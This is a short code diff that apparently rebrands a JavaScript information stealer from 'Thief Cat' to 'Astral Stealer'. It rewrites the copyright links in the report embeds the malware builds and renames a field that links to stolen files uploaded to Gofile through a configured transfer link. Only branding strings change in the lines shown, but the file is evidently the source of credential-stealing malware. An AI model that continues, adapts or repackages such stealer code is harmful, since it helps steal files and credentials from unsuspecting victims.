@@ -645,7 +645,7 @@ async function execScript(str) {
             },
             {
               name: "@Copyright",
-              value: `[Thief Cat 2023 <a:caat:1130448857436782682>](https://github.com/ThiefCatify/ThiefCat)`,
+              value: `[Astral Stealer 2024](https://github.com/freeman649)`,
               inline: !0,
             },
             {
@@ -1616,11 +1616,11 @@ async function execScript(str) {
                   },
                   {
                     name: "@Copyright",
-                    value: `[Thief Cat 2023 <a:caat:1130448857436782682>](https://t.me/Sordeal)`,
+                    value: `[Astral Stealer 2024](https://github.com/freeman649)`,
                     inline: !0,
                   },
                   {
-                    name: "ThiefCatified Files",
+                    name: "Astral Files",
                     value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
                     inline: !0,
                   },
